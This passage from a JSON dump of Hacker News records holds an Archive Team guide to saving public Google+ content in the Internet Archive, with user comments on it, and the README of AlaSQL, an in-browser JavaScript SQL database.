Archive Team are generally not interested in your helpful comments and/or suggestions about alternative technologies, unless you're exceptionally qualified on the matter.)When you launch the Warrior you'll be presented with a list of current projects. Select the \"Googleplus\" project to archive Google+ content.If your bandwidth is shared, limited, or metered, you can specifically limit bandwidth usage through the virtual machine, see instructions for specific VMs.You can request or add specific URLs to the Internet Archive directlyIt's possible to save items directly to the Internet Archive by other mechanisms. This is independent of the Archive Team's GooglePlus project and does not affect either the content they collect or the fetchlist compilation.Methods may be appropriate for single items or large-scale (100s, 1,000s, or 1,000,000s) of requests. So long as requests are legitimate, they are actively encouraged by the Archive.Using the Wayback MachineSingle pages may be saved by navigating to https://web.archive.org/ and entering the URL into the \"Save Page Now\" form (should be on the right side of the page).Using DuckDuckGoThe !wayback bang search will search for a page in the Internet Archive. If it is not found there will be a dialogue on the result page offering to \"save page now\".Alternatives are !waybackmachine and !wbm.There is also a !save bang but this is broken and does not work. This has been reported to DDG, though it's not yet fixed.Using Internet Archive browser extensionsThese are a bit more cumbersome than I'd like but there are extensions for all major browsers as well as iOS and Android which allow interactions with the Internet Archive, including a \"save page now\" feature. See: \"If you See Something, Save Something\", listing extensions for Chrome, Firefox, Safari, iOS, Android, and a Javascript Bookmarklet.Using the \"save\" URL formatIf you want to save a large number of URLs, or save them from a command line, you can use a specific URL format to do so:https://web.archive.org/save/<URL> Where <URL> is the page you want to save. For example, to save the Google+ Mass Migration Community homepage, at https://plus.google.com/communities/112164273001338979772, you'd use:https://web.archive.org/save/https://plus.google.com/communities/112164273001338979772 This can be scripted for both individual and large-scale batch archival. For Linux, MacOS / OSX, BSD, and other Unix-like operating systems (including Android with Termux, or Windows, with a Unix/Linux environment), the following script (I've saved this as archive-url) will archive the requested URL:#!/bin/bash # archive-url # Archive selected URL at the Internet Archive curl -s -I -H \"Accept: application/json\" \"https://web.archive.org/save/${1}\" | grep '^x-cache-key:' | sed \"s,https,&://,; s,\\(${1}\\).*$,\\1,\" Save that to your execution path (I've chosen ~/bin, you might use /usr/local/bin or another location on your $PATH, and invoke as, say (again referring to the G+MM homepage):$ archive-url https://plus.google.com/communities/112164273001338979772 If you have a list of URLs in a file (or pipelined from command output), you can request all of them to be archived in a simple bash loop. I'm using xargs here to run ten simultaneous requests from the file gplus-urllist:cat gplus_urllist | while read url do xargs -I{} -P 10 archive-url {}; done I've run this on over 10,000 URLs over a modest residential broadband connection in a hair over two hours.Note that such requests trigger an archive by the Internet Archive from one of its archiving nodes, you're not sending the page to the Archive yourself. In particular, archival from regions defaulting to another language may result in the Google+ site content (but not post or comments) being in a different language. I've frequently seen my pages turning up in Japanese, for instance.How can I specifically access archived content later?If you know the URL of the item, you can request it directly from the Internet Archive. The browser extensions above can simplify this for you. There are also specific tools for querying and interacting with the Wayback Machine repository.Again, using DuckDuckGo (especially when setting this as your default browser), you can access pages directly using the !wayback bang search, entered before the URL in your browser's Navigation bar.Command-line use of the Internet Archive is limited as the site now depends on JavaScript. Tools such as curl, wget, GET, or console browsers including lynx, links, elinks, w3m, etc., can not access archived content directly. You'll need a graphical browser.There are a set of Wayback Machine APIs which can test for archives of a known URL.From a given Wayback Machine page, you can generally search for all pages under some specific URL. This is of mixed use for Google+ content:Google+ post URLs are given by userID or novelty URL, so you should be able to search for all content by a specific user or Google+ Page profile.Google+ Collection, Community, and some other selections, are not indicated by URL. The Wayback Machine has no intrinsic way of knowing what content belongs to what Collection or Community.There are tools to assist with rebuilding websites based on Wayback Machine archives. Whether or not these will support Google+ user, Page, Collection, or Community accounts is not presently clear, though we'll try to provide information as it becomes available.Tools:Wayback RebuilderWayback DownloaderWayback Machine DownloaderWayback DownloadsThere may be other ways for searching for or accessing content on the Wayback Machine, and we'll add information as we receive it.Results: 98.5% of Profiles, 90%+ of CommunitiesAs of the April 2 shutdown, roughly 9 am US/Pacific time, the Archive Team's pull was 98.5% complete (by profiles listed), and 90%+ of G+ Communities were also saved (allowing for paginated perusal of these).Contents should appear in the Wayback Machine over coming weeks.This was the largest single Archive Team project to date, and represents ~10% of the total Internet Archive holding as of 2012.Thanks ...... to the Archive Team for taking this on, the Internet Archive for hosting it, and to Fusl for answering all my pesky questions over the past few hours on the details of processing.Fusl, arkiver, and Jason Scott are awesome. ",
          "I'm not sure how I feel about this.<p>Over the last couple years it has become increasingly clear that public personal social media history is a liability. People's histories have often been weaponized against them, and mass processing of social media has been used as a weapon against society as a whole (Cambridge Analytica, etc.).<p>I recently deleted my Facebook account, but didn't take the time to delete Google+ because I figured it was about to disappear anyway. But now it turns out some people are building a public archive of my content, and presumably they aren't going to give me a way to delete it. This makes me uncomfortable. I have now deleted my Google+ history; I hope they didn't get much of it.<p>To be clear, I think the Internet Archive is good people with noble intentions. But given what we've learned recently about social media possibly being a huge mistake... this effort worries me.",
          "There are a few gems on Google+ that would be a shame to lose, like:<p><a href=\"https://plus.google.com/101960720994009339267/posts/R58WgWwN9jp\" rel=\"nofollow\">https://plus.google.com/101960720994009339267/posts/R58WgWwN...</a><p>Archived copy: <a href=\"http://archive.is/4kpvd\" rel=\"nofollow\">http://archive.is/4kpvd</a>"
        ],
        "story_type": ["Normal"],
        "url": "https://www.reddit.com/r/plexodus/comments/az285j/saving_of_public_google_content_at_the_internet/",
        "comments.comment_id": [19408763, 19408784],
        "comments.comment_author": ["kentonv", "tyingq"],
        "comments.comment_descendants": [11, 3],
        "comments.comment_time": [
          "2019-03-16T16:55:04Z",
          "2019-03-16T16:59:40Z"
        ],
        "comments.comment_text": [
          "I'm not sure how I feel about this.<p>Over the last couple years it has become increasingly clear that public personal social media history is a liability. People's histories have often been weaponized against them, and mass processing of social media has been used as a weapon against society as a whole (Cambridge Analytica, etc.).<p>I recently deleted my Facebook account, but didn't take the time to delete Google+ because I figured it was about to disappear anyway. But now it turns out some people are building a public archive of my content, and presumably they aren't going to give me a way to delete it. This makes me uncomfortable. I have now deleted my Google+ history; I hope they didn't get much of it.<p>To be clear, I think the Internet Archive is good people with noble intentions. But given what we've learned recently about social media possibly being a huge mistake... this effort worries me.",
          "There are a few gems on Google+ that would be a shame to lose, like:<p><a href=\"https://plus.google.com/101960720994009339267/posts/R58WgWwN9jp\" rel=\"nofollow\">https://plus.google.com/101960720994009339267/posts/R58WgWwN...</a><p>Archived copy: <a href=\"http://archive.is/4kpvd\" rel=\"nofollow\">http://archive.is/4kpvd</a>"
        ],
        "id": "40054099-8bfb-417a-956a-d2a4a6ff3a90",
        "url_text": "The archiving of public Google+ content to the Internet Archive by the ArchiveTeam has has begun.What does this mean, how does this affect you, and what can you do?TL;DR: Most public Google+ content should live on at the Internet Archive thanks to a fanatical bunch of volunteers, and you can help.The Internet ArchiveThe Internet Archive is a digital library with the stated mission of \"universal access to all knowledge\". Though often known for its Web archives, the \"Wayback Machine\", it also preserves texts, audio, video, software, and other formats. Think of the Wayback Machine as the Web's attic, or basement, or storage locker.https://www.archive.org/Wikipedia has a good article on the Internet Archive.The Archive TeamArchive Team is a loose collective of rogue archivists, programmers, writers and loudmouths dedicated to saving our digital heritage. Since 2009 this variant force of nature has caught wind of shutdowns, shutoffs, mergers, and plain old deletions - and done our best to save the history before it's lost forever.https://www.archiveteam.org/The Archive Team works closely with, but is not affiliated with the Internet Archive. It runs projects to save bits of Web history that appear likely to be lost. Past projects include Mozilla Addons, Tindeck, and UOL Forums (the \"Brazillian AOL\"), whilst present projects include Flickr and Tumblr, as well as several manual projects. The group maintains Deathwatch and Fire Drill lists of sites or platforms thought to be in peril or of significance.Archive Team have previously saved other social media site content, and have several on their watchlists, including larger sites such as YouTube, Facebook, CodeAcademy, LiveJournal, Reddit, Twitter, WikiLeaks, and Wikipedia. This group thinks big.Archive projects run using a tool called \"Warrior\", based on \"grabber\" scripts, which run in a virtual machine (VirtualBox, VMWare, or other virtualisation systems) on a desktop or server system. Current Warrior images are available online: https://www.archiveteam.org/index.php?title=WarriorMore on Warrior below under \"What can you do?\".There's an IRC channel on EFnet: irc://irc.efnet.org/#archiveteamAnd a subreddit: https://old.reddit.com/r/Archiveteam/The Google+ Archive ProjectArchive Team became aware that Google+ was shutting down in December of 2018. The G+MM / Plexodus effort became aware of Archive Team in January of 2019. We've been sharing information and planning over the past few months, including the copious information we've collected on Google+ size, activity, profiles, communities, and characteristics of the site and platform.There's a (not particularly up-to-date) Wiki page largely consisting of Google's shutdown announcements: https://www.archiveteam.org/index.php?title=Google%2BThe actual archive code lives on GitHub: https://github.com/ArchiveTeam/googleplus-grabThe more interesting project tracker, showing updates in realtime, is: http://tracker.archiveteam.org/googleplus/Note that this shows only 1/50th of the total project at a time. \"Items\" are sitemap subsets of 100 profiles, and 50 batches of 1,000 sitemaps at a time, each with about 680 or so items, will be processed over the course of this archival. The tracker shows the status only of the current batch. Total profiles archived are 50 batches * 1,000 sitemaps/batch * 680 items/sitemap * 100 profiles/item = 3.4 billion profiles, or the total number of Google+ profiles (as of March, 2017). There will be 34 million items, total, in the overall process.How does this affect you as a Google+ user?If you do absolutely nothing, there is a very good chance that much of your public Google+ content will be preserved by Archive Team, on the Internet Archive, and will be publicly visible there.If you do want this to happen ... you're in luck. Don't delete your Google+ content or profile and it should be saved.If you don't want this to happen, you can request removal of specific items through the Internet Archive's procedure: https://help.archive.org/hc/en-us/articles/360004716091-Wayback-Machine-General-Information and https://help.archive.org/hc/en-us/articles/360018138951-How-do-I-remove-an-item-page-from-the-site-If you want to help, keep reading.LimitationsThere are a few limitations to this project:Only public content that is presently available on Google+ is being included. Private posts, and any previously deleted content will not be saved. (Previously saved content that's since been deleted will be available.)Full post comments may not be archived. Google+ allows up to 500 comments per post, but only presents a subset of these as static HTML. It's not clear that long discussion threads will be preserved. Historically they have not been.Image and video content may not be preserved at full resolution. This will apply mostly to high-def image and video content, though photographers may want to be aware.Content archival is subject to the rate at which the project can proceed and any limitations imposed outside its control. From past experience, the Archive Team can suck in amazing amounts of data quickly, and general success is likely.What can you do to help?Contributions can be made in the way of funds or volunteering services, particularly as an archive Warrior, running an archive instance yourself.The Internet Archive is fueled by donations, which provide servers, disk, and bandwidth to receive and share content. It costs the Archive about $2,000 to host 1 terabyte of data:https://archive.org/donateDonate to the Archive Team directlyFor the most part, contributing to the Internet Archive is strongly encouraged, as they do the heavy lifting, but Archive Team has its own smaller contributions project:https://opencollective.com/archiveteamIf you have the technical resources and skills, run a Warrior instancePeople with access to large-scale storage and high-bandwidth network connections are especially appreciated.What you'll need:A desktop, server computer, or \"cloud\" hosted system(s),A Virtual Machine server, including VirtualBox, VMWare, Docker and Hyper-V.At least 60 GB of free disk space.At least TK of free memory.A sufficiently high-bandwidth connection. 100 Mb/s+ or better is recommended.Skills and understanding to run all of this.If you don't understand part or any of this or the referenced documentation, and cannot get up and running by yourself, we'll manage without you. Self-supporting volunteers are appreciated.Archive Warriors volunteer their time, resources, and services, there is no compensation. If you wish to solicit donations on your own, you may do so.There are a set of requirements for your Internet connection itself. Please do NOT run a Warrior instance if any of the following apply:No OpenDNS. No ISP DNS that redirects to a search page. Use non-captive DNS servers.No ISP connections that inject advertisements into web pages.No proxies. Proxies can return bad data. The original HTTP headers and IP address are needed for the WARC file.No content-filtering firewalls.No censorship. If you believe your country implements censorship, do not run a warrior.No Tor. The server may return an error page instead of content if they ban exit nodes.No free cafe wifi. Archiving your cafe's wifi service agreement repeatedly is not helpful.No VPNs. Data integrity is a very high priority for the Archive Team so use of VPNs with the official crawler is discouraged.We prefer connections from many public IP addresses if possible. (For example, if your apartment building uses a single IP address, we don't want your apartment banned.)There are additional information, instructions, troubleshooting, and guidance at the Archive Team Warrior Wiki page:https://www.archiveteam.org/index.php?title=ArchiveTeam_WarriorAnd on the googleplus-grab GitHub pagehttps://github.com/ArchiveTeam/googleplus-grabNote that Warrior utilises a specially [Lua](https://en.wikipedia.org/wiki/Lua_(programming_language)-instrumented version of wget to produce WARC images, a standard developed by the Internet Archive and very widely adopted, as the Library of Congress link above indicates.(The Internet Archive and Archive Team are generally not interested in your helpful comments and/or suggestions about alternative technologies, unless you're exceptionally qualified on the matter.)When you launch the Warrior you'll be presented with a list of current projects. Select the \"Googleplus\" project to archive Google+ content.If your bandwidth is shared, limited, or metered, you can specifically limit bandwidth usage through the virtual machine, see instructions for specific VMs.You can request or add specific URLs to the Internet Archive directlyIt's possible to save items directly to the Internet Archive by other mechanisms. This is independent of the Archive Team's GooglePlus project and does not affect either the content they collect or the fetchlist compilation.Methods may be appropriate for single items or large-scale (100s, 1,000s, or 1,000,000s) of requests. So long as requests are legitimate, they are actively encouraged by the Archive.Using the Wayback MachineSingle pages may be saved by navigating to https://web.archive.org/ and entering the URL into the \"Save Page Now\" form (should be on the right side of the page).Using DuckDuckGoThe !wayback bang search will search for a page in the Internet Archive. If it is not found there will be a dialogue on the result page offering to \"save page now\".Alternatives are !waybackmachine and !wbm.There is also a !save bang but this is broken and does not work. This has been reported to DDG, though it's not yet fixed.Using Internet Archive browser extensionsThese are a bit more cumbersome than I'd like but there are extensions for all major browsers as well as iOS and Android which allow interactions with the Internet Archive, including a \"save page now\" feature. See: \"If you See Something, Save Something\", listing extensions for Chrome, Firefox, Safari, iOS, Android, and a Javascript Bookmarklet.Using the \"save\" URL formatIf you want to save a large number of URLs, or save them from a command line, you can use a specific URL format to do so:https://web.archive.org/save/<URL> Where <URL> is the page you want to save. For example, to save the Google+ Mass Migration Community homepage, at https://plus.google.com/communities/112164273001338979772, you'd use:https://web.archive.org/save/https://plus.google.com/communities/112164273001338979772 This can be scripted for both individual and large-scale batch archival. For Linux, MacOS / OSX, BSD, and other Unix-like operating systems (including Android with Termux, or Windows, with a Unix/Linux environment), the following script (I've saved this as archive-url) will archive the requested URL:#!/bin/bash # archive-url # Archive selected URL at the Internet Archive curl -s -I -H \"Accept: application/json\" \"https://web.archive.org/save/${1}\" | grep '^x-cache-key:' | sed \"s,https,&://,; s,\\(${1}\\).*$,\\1,\" Save that to your execution path (I've chosen ~/bin, you might use /usr/local/bin or another location on your $PATH, and invoke as, say (again referring to the G+MM homepage):$ archive-url https://plus.google.com/communities/112164273001338979772 If you have a list of URLs in a file (or pipelined from command output), you can request all of them to be archived in a simple bash loop. I'm using xargs here to run ten simultaneous requests from the file gplus-urllist:cat gplus_urllist | while read url do xargs -I{} -P 10 archive-url {}; done I've run this on over 10,000 URLs over a modest residential broadband connection in a hair over two hours.Note that such requests trigger an archive by the Internet Archive from one of its archiving nodes, you're not sending the page to the Archive yourself. In particular, archival from regions defaulting to another language may result in the Google+ site content (but not post or comments) being in a different language. I've frequently seen my pages turning up in Japanese, for instance.How can I specifically access archived content later?If you know the URL of the item, you can request it directly from the Internet Archive. The browser extensions above can simplify this for you. There are also specific tools for querying and interacting with the Wayback Machine repository.Again, using DuckDuckGo (especially when setting this as your default browser), you can access pages directly using the !wayback bang search, entered before the URL in your browser's Navigation bar.Command-line use of the Internet Archive is limited as the site now depends on JavaScript. Tools such as curl, wget, GET, or console browsers including lynx, links, elinks, w3m, etc., can not access archived content directly. You'll need a graphical browser.There are a set of Wayback Machine APIs which can test for archives of a known URL.From a given Wayback Machine page, you can generally search for all pages under some specific URL. This is of mixed use for Google+ content:Google+ post URLs are given by userID or novelty URL, so you should be able to search for all content by a specific user or Google+ Page profile.Google+ Collection, Community, and some other selections, are not indicated by URL. The Wayback Machine has no intrinsic way of knowing what content belongs to what Collection or Community.There are tools to assist with rebuilding websites based on Wayback Machine archives. Whether or not these will support Google+ user, Page, Collection, or Community accounts is not presently clear, though we'll try to provide information as it becomes available.Tools:Wayback RebuilderWayback DownloaderWayback Machine DownloaderWayback DownloadsThere may be other ways for searching for or accessing content on the Wayback Machine, and we'll add information as we receive it.Results: 98.5% of Profiles, 90%+ of CommunitiesAs of the April 2 shutdown, roughly 9 am US/Pacific time, the Archive Team's pull was 98.5% complete (by profiles listed), and 90%+ of G+ Communities were also saved (allowing for paginated perusal of these).Contents should appear in the Wayback Machine over coming weeks.This was the largest single Archive Team project to date, and represents ~10% of the total Internet Archive holding as of 2012.Thanks ...... to the Archive Team for taking this on, the Internet Archive for hosting it, and to Fusl for answering all my pesky questions over the past few hours on the details of processing.Fusl, arkiver, and Jason Scott are awesome. ",
        "_version_": 1718527394430582784
      },
      {
        "story_id": [18902197],
        "story_author": ["truth_seeker"],
        "story_descendants": [43],
        "story_score": [120],
        "story_time": ["2019-01-14T11:17:20Z"],
        "story_title": "AlaSQL.js – JavaScript SQL Database for Browser and Node.js",
        "search": [
          "AlaSQL.js – JavaScript SQL Database for Browser and Node.js",
          "https://github.com/agershun/alasql",
          "AlaSQL is an open source project used on more than two million page views per month - and we appreciate any and all contributions we can get. Please help out. Have a question? Ask on Stack Overflow using the \"alasql\" tag. AlaSQL - ( la SQL ) [l skju:l] - is an open source SQL database for JavaScript with a strong focus on query speed and data source flexibility for both relational data and schemaless data. It works in the web browser, Node.js, and mobile apps. This library is designed for: Fast in-memory SQL data processing for BI and ERP applications on fat clients Easy ETL and options for persistence by data import / manipulation / export of several formats All major browsers, Node.js, and mobile applications We focus on speed by taking advantage of the dynamic nature of JavaScript when building up queries. Real-world solutions demand flexibility regarding where data comes from and where it is to be stored. We focus on flexibility by making sure you can import/export and query directly on data stored in Excel (both .xls and .xlsx), CSV, JSON, TAB, IndexedDB, LocalStorage, and SQLite files. The library adds the comfort of a full database engine to your JavaScript app. No, really - it's working towards a full database engine complying with most of the SQL-99 language, spiced up with additional syntax for NoSQL (schema-less) data and graph networks. Traditional SQL Table /* create SQL Table and add data */ alasql(\"CREATE TABLE cities (city string, pop number)\"); alasql(\"INSERT INTO cities VALUES ('Paris',2249975),('Berlin',3517424),('Madrid',3041579)\"); /* execute query */ var res = alasql(\"SELECT * FROM cities WHERE pop < 3500000 ORDER BY pop DESC\"); // res = [ { \"city\": \"Madrid\", \"pop\": 3041579 }, { \"city\": \"Paris\", \"pop\": 2249975 } ] Live Demo Array of Objects var data = [ {a: 1, b: 10}, {a: 2, b: 20}, {a: 1, b: 30} ]; var res = alasql('SELECT a, SUM(b) AS b FROM ? GROUP BY a',[data]); // res = [ { \"a\": 1, \"b\": 40},{ \"a\": 2, \"b\": 20 } ] Live Demo Spreadsheet // file is read asynchronously (Promise returned when SQL given as array) alasql(['SELECT * FROM XLS(\"./data/mydata\") WHERE lastname LIKE \"A%\" and city = \"London\" GROUP BY name ']) .then(function(res){ console.log(res); // output depends on mydata.xls }).catch(function(err){ console.log('Does the file exist? There was an error:', err); }); Bulk Data Load alasql(\"CREATE TABLE example1 (a INT, b INT)\"); // alasql's data store for a table can be assigned directly alasql.tables.example1.data = [ {a:2,b:6}, {a:3,b:4} ]; // ... or manipulated with normal SQL alasql(\"INSERT INTO example1 VALUES (1,5)\"); var res = alasql(\"SELECT * FROM example1 ORDER BY b DESC\"); console.log(res); // [{a:2,b:6},{a:1,b:5},{a:3,b:4}] If you are familiar with SQL it should come as no surprise that proper use of indexes on your tables is essential to get good performance. Installation yarn add alasql # yarn npm install alasql # npm npm install -g alasql # global installation for command line tools For the browser: include alasql.min.js <script src=\"https://cdn.jsdelivr.net/npm/alasql@1.7\"></script> Getting started See the \"Getting started\" section of the wiki More advanced topics are covered in other wiki sections like \"Data manipulation\" and in questions on Stack Overflow Other links: Documentation: Github wiki Library CDN: jsDelivr.com Feedback: Open an issue Try online: Playground Website: alasql.org Please note All contributions are extremely welcome and greatly appreciated(!) - The project has never received any funding and is based on unpaid voluntary work: We really (really) love pull requests The AlaSQL project depends on your contribution of code and may have bugs. So please, submit any bugs and suggestions as an issue. Please check out the limitations of the library. Performance AlaSQL is designed for speed and includes some of the classic SQL engine optimizations: Queries are cached as compiled functions Joined tables are pre-indexed WHERE expressions are pre-filtered for joins See more performance-related info on the wiki Features you might like Traditional SQL Use \"good old\" SQL on your data with multiple levels of: JOIN, VIEW, GROUP BY, UNION, PRIMARY KEY, ANY, ALL, IN, ROLLUP(), CUBE(), GROUPING SETS(), CROSS APPLY, OUTER APPLY, WITH SELECT, and subqueries. The wiki lists supported SQL statements and keywords. User-Defined Functions in your SQL You can use all benefits of SQL and JavaScript together by defining your own custom functions. Just add new functions to the alasql.fn object: alasql.fn.myfn = function(a,b) { return a*b+1; }; var res = alasql('SELECT myfn(a,b) FROM one'); You can also define your own aggregator functions (like your own SUM(...)). See more in the wiki Compiled statements and functions var ins = alasql.compile('INSERT INTO one VALUES (?,?)'); ins(1,10); ins(2,20); See more in the wiki SELECT against your JavaScript data Group your JavaScript array of objects by field and count number of records in each group: var data = [{a:1,b:1,c:1},{a:1,b:2,c:1},{a:1,b:3,c:1}, {a:2,b:1,c:1}]; var res = alasql('SELECT a, COUNT(*) AS b FROM ? GROUP BY a', [data] ); See more ideas for creative data manipulation in the wiki JavaScript Sugar AlaSQL extends \"good old\" SQL to make it closer to JavaScript. The \"sugar\" includes: Write Json objects - {a:'1',b:@['1','2','3']} Access object properties - obj->property->subproperty Access object and arrays elements - obj->(a*1) Access JavaScript functions - obj->valueOf() Format query output with SELECT VALUE, ROW, COLUMN, MATRIX ES5 multiline SQL with var SQL = function(){/*SELECT 'MY MULTILINE SQL'*/} and pass instead of SQL string (will not work if you compress your code) Read and write Excel and raw data files You can import from and export to CSV, TAB, TXT, and JSON files. File extensions can be omitted. Calls to files will always be asynchronous so multi-file queries should be chained: var tabFile = 'mydata.tab'; alasql.promise([ \"SELECT * FROM txt('MyFile.log') WHERE [0] LIKE 'M%'\", // parameter-less query [ \"SELECT * FROM tab(?) ORDER BY [1]\", [tabFile] ], // [query, array of params] \"SELECT [3] AS city,[4] AS population FROM csv('./data/cities')\", \"SELECT * FROM json('../config/myJsonfile')\" ]).then(function(results){ console.log(results); }).catch(console.error); Read SQLite database files AlaSQL can read (but not write) SQLite data files using SQL.js library: <script src=\"alasql.js\"></script> <script src=\"sql.js\"></script> <script> alasql([ 'ATTACH SQLITE DATABASE Chinook(\"Chinook_Sqlite.sqlite\")', 'USE Chinook', 'SELECT * FROM Genre' ]).then(function(res){ console.log(\"Genres:\",res.pop()); }); </script> sql.js calls will always be asynchronous. AlaSQL works in the console - CLI The node module ships with an alasql command-line tool: $ npm install -g alasql ## install the module globally $ alasql -h ## shows usage information $ alasql \"SET @data = @[{a:'1',b:?},{a:'2',b:?}]; SELECT a, b FROM @data;\" 10 20 [ 1, [ { a: 1, b: 10 }, { a: 2, b: 20 } ] ] $ alasql \"VALUE OF SELECT COUNT(*) AS abc FROM TXT('README.md') WHERE LENGTH([0]) > ?\" 140 // Number of lines with more than 140 characters in README.md More examples are included in the wiki Features you might love AlaSQL D3.js AlaSQL plays nice with d3.js and gives you a convenient way to integrate a specific subset of your data with the visual powers of D3. See more about D3.js and AlaSQL in the wiki AlaSQL Excel AlaSQL can export data to both Excel 2003 (.xls) and Excel 2007 (.xlsx) formats with coloring of cells and other Excel formatting functions. AlaSQL Meteor Meteor is amazing. You can query directly on your Meteor collections with SQL - simple and easy. See more about Meteor and AlaSQL in the wiki AlaSQL Angular.js Angular is great. In addition to normal data manipulation, AlaSQL works like a charm for exporting your present scope to Excel. See more about Angular and AlaSQL in the wiki AlaSQL Google Maps Pinpointing data on a map should be easy. AlaSQL is great to prepare source data for Google Maps from, for example, Excel or CSV, making it one unit of work for fetching and identifying what's relevant. See more about Google Maps and AlaSQL in the wiki AlaSQL Google Spreadsheets AlaSQL can query data directly from a Google spreadsheet. A good \"partnership\" for easy editing and powerful data manipulation. See more about Google Spreadsheets and AlaSQL in the wiki Miss a feature? Take charge and add your idea or vote for your favorite feature to be implemented: Limitations Please be aware that AlaSQL has bugs. Beside having some bugs, there are a number of limitations: AlaSQL has a (long) list of keywords that must be escaped if used for column names. When selecting a field named key please write SELECT `key` FROM ... instead. This is also the case for words like `value`, `read`, `count`, `by`, `top`, `path`, `deleted`, `work` and `offset`. Please consult the full list of keywords. It is OK to SELECT 1000000 records or to JOIN two tables with 10000 records in each (You can use streaming functions to work with longer datasources - see test/test143.js) but be aware that the workload is multiplied so SELECTing from more than 8 tables with just 100 rows in each will show bad performance. This is one of our top priorities to make better. Limited functionality for transactions (supports only for localStorage) - Sorry, transactions are limited, because AlaSQL switched to more complex approach for handling PRIMARY KEYs / FOREIGN KEYs. Transactions will be fully turned on again in a future version. A (FULL) OUTER JOIN and RIGHT JOIN of more than 2 tables will not produce expected results. INNER JOIN and LEFT JOIN are OK. Please use aliases when you want fields with the same name from different tables (SELECT a.id AS a_id, b.id AS b_id FROM ?). At the moment AlaSQL does not work with JSZip 3.0.0 - please use version 2.x. JOINing a sub-SELECT does not work. Please use a with structure (Example here) or fetch the sub-SELECT to a variable and pass it as an argument (Example here). AlaSQL uses the FileSaver.js library for saving files locally from the browser. Please be aware that it does not save files in Safari 8.0. There are probably many others. Please help us fix them by submitting an issue. Thank you! How To Use AlaSQL to convert data from CSV to Excel ETL example: alasql([ 'CREATE TABLE IF NOT EXISTS geo.country', 'SELECT * INTO geo.country FROM CSV(\"country.csv\",{headers:true})', 'SELECT * INTO XLSX(\"asia\") FROM geo.country WHERE continent_name = \"Asia\"' ]).then(function(res){ // results from the file asia.xlsx }); Use AlaSQL as a Web Worker AlaSQL can run in a Web Worker. Please be aware that all interaction with AlaSQL when running must be async. From the browser thread, the browser build alasql-worker.min.js automagically uses Web Workers: <script src=\"alasql-worker.min.js\"></script> <script> var arr = [{a:1},{a:2},{a:1}]; alasql([['SELECT * FROM ?',[arr]]]).then(function(data){ console.log(data); }); </script> Live Demo. The standard build alasql.min.js will use Web Workers if alasql.worker() is called: <script src=\"alasql.min.js\"></script> <script> alasql.worker(); alasql(['SELECT VALUE 10']).then(function(res){ console.log(res); }).catch(console.error); </script> Live Demo. From a Web Worker, you can import alasql.min.js with importScripts: importScripts('alasql.min.js'); Webpack, Browserify, Vue and React (Native) When targeting the browser, several code bundlers like Webpack and Browserify will pick up modules you might not want. Here's a list of modules that AlaSQL may require in certain environments or for certain features: Node.js fs net tls request path React Native react-native react-native-fs react-native-fetch-blob Vertx vertx Agonostic XLSX/XLS support cptable jszip xlsx cpexcel es6-promise Webpack There are several ways to handle AlaSQL with Webpack: IgnorePlugin Ideal when you want to control which modules you want to import. var IgnorePlugin = require(\"webpack\").IgnorePlugin; module.exports = { ... // Will ignore the modules fs, path, xlsx, request, vertx, and react-native modules plugins:[new IgnorePlugin(/(^fs$|cptable|jszip|xlsx|^es6-promise$|^net$|^tls$|^forever-agent$|^tough-cookie$|cpexcel|^path$|^request$|react-native|^vertx$)/)] }; module.noParse As of AlaSQL 0.3.5, you can simply tell Webpack not to parse AlaSQL, which avoids all the dynamic require warnings and avoids using eval/clashing with CSP with script-loader. Read the Webpack docs about noParse ... //Don't parse alasql {module:noParse:[/alasql/]} script-loader If both of the solutions above fail to meet your requirements, you can load AlaSQL with script-loader. //Load alasql in the global scope with script-loader import \"script!alasql\" This can cause issues if you have a CSP that doesn't allow eval. Browserify Read up on excluding, ignoring, and shimming Example (using excluding) var browserify = require(\"browserify\"); var b = browserify(\"./main.js\").bundle(); //Will ignore the modules fs, path, xlsx [\"fs\",\"path\",\"xlsx\", ... ].forEach(ignore => { b.ignore(ignore) }); Vue For some frameworks (lige Vue) alasql cant access XLSX by it self. We recommend handeling it by including AlaSQL the following way: import XLSX from 'xlsx'; alasql.utils.isBrowserify = false; alasql.utils.global.XLSX = XLSX; jQuery Please remember to send the original event, and not the jQuery event, for elements. (Use event.originalEvent instead of myEvent) JSON-object You can use JSON objects in your databases (do not forget use == and !== operators for deep comparison of objects): alasql> SELECT VALUE {a:'1',b:'2'} {a:1,b:2} alasql> SELECT VALUE {a:'1',b:'2'} == {a:'1',b:'2'} true alasql> SELECT VALUE {a:'1',b:'2'}->b 2 alasql> SELECT VALUE {a:'1',b:(2*2)}->b 4 Try AlaSQL JSON objects in Console [sample](http://alasql.org/console?drop table if exists one;create table one;insert into one values {a:@[1,2,3],c:{e:23}}, {a:@[{b:@[1,2,3]}]};select * from one) Experimental Useful stuff, but there might be dragons Graphs AlaSQL is a multi-paradigm database with support for graphs that can be searched or manipulated. // Who loves lovers of Alice? var res = alasql('SEARCH / ANY(>> >> #Alice) name'); console.log(res) // ['Olga','Helen'] See more in the wiki localStorage and DOM-storage You can use browser localStorage and DOM-storage as a data storage. Here is a sample: alasql('CREATE localStorage DATABASE IF NOT EXISTS Atlas'); alasql('ATTACH localStorage DATABASE Atlas AS MyAtlas'); alasql('CREATE TABLE IF NOT EXISTS MyAtlas.City (city string, population number)'); alasql('SELECT * INTO MyAtlas.City FROM ?',[ [ {city:'Vienna', population:1731000}, {city:'Budapest', population:1728000} ] ]); var res = alasql('SELECT * FROM MyAtlas.City'); Try this sample in jsFiddle. Run this sample two or three times, and AlaSQL store more and more data in localStorage. Here, \"Atlas\" is the name of localStorage database, where \"MyAtlas\" is a memory AlaSQL database. You can use localStorage in two modes: SET AUTOCOMMIT ON to immediate save data to localStorage after each statement or SET AUTOCOMMIT OFF. In this case, you need to use COMMIT statement to save all data from in-memory mirror to localStorage. Plugins AlaSQL supports plugins. To install a plugin you need to use the REQUIRE statement. See more in the wiki Alaserver - simple database server Yes, you can even use AlaSQL as a very simple server for tests. To run enter the command: then open http://127.0.0.1:1337/?SELECT%20VALUE%20(2*2) in your browser Warning: Alaserver is not multi-threaded, not concurrent, and not secured. Tests Regression tests AlaSQL currently has over 1200 regression tests, but they only cover of the codebase. AlaSQL uses mocha for regression tests. Install mocha and run or open test/index.html for in-browser tests (Please serve via localhost with, for example, http-server). Tests with AlaSQL ASSERT from SQL You can use AlaSQL's ASSERT operator to test the results of previous operation: CREATE TABLE one (a INT); ASSERT 1; INSERT INTO one VALUES (1),(2),(3); ASSERT 3; SELECT * FROM one ORDER BY a DESC; ASSERT [{a:3},{a:2},{a:1}]; SQLLOGICTEST AlaSQL uses SQLLOGICTEST to test its compatibility 